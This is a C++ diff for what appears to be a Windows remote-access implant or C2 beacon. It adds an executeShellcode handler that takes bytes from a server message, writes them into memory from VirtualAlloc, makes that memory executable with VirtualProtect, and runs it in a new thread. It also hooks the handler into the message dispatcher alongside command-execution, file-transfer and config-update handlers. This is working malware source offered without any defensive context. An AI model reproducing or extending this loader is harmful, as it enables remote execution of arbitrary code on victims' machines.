@@ -63,6 +63,51 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 
 }
 
+//bool MessageHandler::executeShellcode(std::vector<uint8_t>& data)
+bool MessageHandler::executeShellcode(InternalMessage& msg)
+{
+	std::cout << "executeShellcode" << std::endl;
+    LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!shellMem) // TODO: checking if it is NULL would be more correct?
+	{
+        // DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
+		return false;
+    }
+
+    // memcpy(beacon_mem, shellcode, bytes_received);
+	// TODO: copy 8 bytes at a time, and then copy left over
+	for (unsigned int i = 0; i < msg.header.dataSize; ++i) 
+	{
+		((char *)shellMem)[i] = msg.data[i];
+	}
+
+    // EXECUTE_READ.
+    DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
+    // NOTE: virtualProtect is also being called somewhere in the windows api
+    if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
+    {
+        // Fail silently if we cannot make the memory executable.
+        return false;
+    }
+
+    // DEBUG_PRINT("6 - Memory allocated and copied");
+
+    // 4.
+    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+    if (!thread) 
+	{
+        // DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
+        return false;
+    }
+
+    // DEBUG_PRINT("7 - Thread created, waiting..."); 
+    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+
+	return true;
+}
+
+
 bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
 {
 	std::cout << "downloadFile" << std::endl;
@@ -94,20 +139,25 @@ void MessageHandler::processMessage(InternalMessage& msg)
 	case MessageType::EXECUTE_COMMAND:
 		executeCommand(msg.data);
 		break;
+	
+	case MessageType::EXECUTE_SHELL_CODE:
+		executeShellcode(msg);
+		//executeShellcode(msg.data);
+		break;
 
-	case UPLOAD_FILE:
+	case MessageType::UPLOAD_FILE:
 		uploadFile(msg.data);
 		break;
 
-	case DOWNLOAD_FILE:
+	case MessageType::DOWNLOAD_FILE:
 		downloadFile(msg.data);
 		break;
 
-	case CONFIG_UPDATE:
+	case MessageType::CONFIG_UPDATE:
 		updateConfig(msg.data);
 		break;
 
-	case ERROR_REPORT:
+	case MessageType::ERROR_REPORT:
 		// Server sent an error, handle it
 		handleServerError(msg.data);
 		break;
